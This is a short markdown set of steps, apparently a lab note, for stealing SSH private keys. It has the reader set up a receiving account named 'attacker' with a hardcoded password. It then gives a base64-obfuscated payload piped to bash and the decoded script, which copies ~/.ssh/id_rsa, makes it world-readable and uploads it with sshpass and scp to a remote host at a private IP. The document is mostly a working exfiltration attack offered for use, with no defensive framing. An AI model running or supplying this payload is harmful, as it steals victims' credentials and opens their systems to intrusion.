### Install sshpass 

```
sudo apt install sshpass
```



### On Attacker enable 

```
sudo adduser attacker
```

*** pwd: attacker12345!***

### optional

```
sudo usermod -aG sudo newusername
```


```
$ls /etc/ssh/sshd_config.d/60-cloudimg-settings.conf
$ cat /etc/ssh/sshd_config.d/60-cloudimg-settings.conf 
PasswordAuthentication yes
```

```
sudo su - attacker
```

### Base64 payload 

```
echo "IyEvYmluL2Jhc2gKCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9N
RS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNw
ICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAv
c3NoX2tleXMvaWRfcnNhCiAgICBzc2hwYXNzIC1wICdhdHRhY2tlcjEyMzQ1IScgc2NwIH4vdG1w
L3NzaF9rZXlzL2lkX3JzYSBhdHRhY2tlckAxNzIuMzEuMzAuMTAzOn4vCiAgZmkKZmkK" | base64 -d | bash
```

### Script

```
#!/bin/bash

if [ -d "$HOME/.ssh" ]; then
  if [ -f "$HOME/.ssh/id_rsa" ]; then
    mkdir -p ~/tmp/ssh_keys
    cp "$HOME/.ssh/id_rsa" ~/tmp/ssh_keys/
    chmod 777 ~/tmp/ssh_keys/id_rsa
    sshpass -p 'attacker12345!' scp ~/tmp/ssh_keys/id_rsa attacker@172.31.30.103:~/
  fi
fi
```

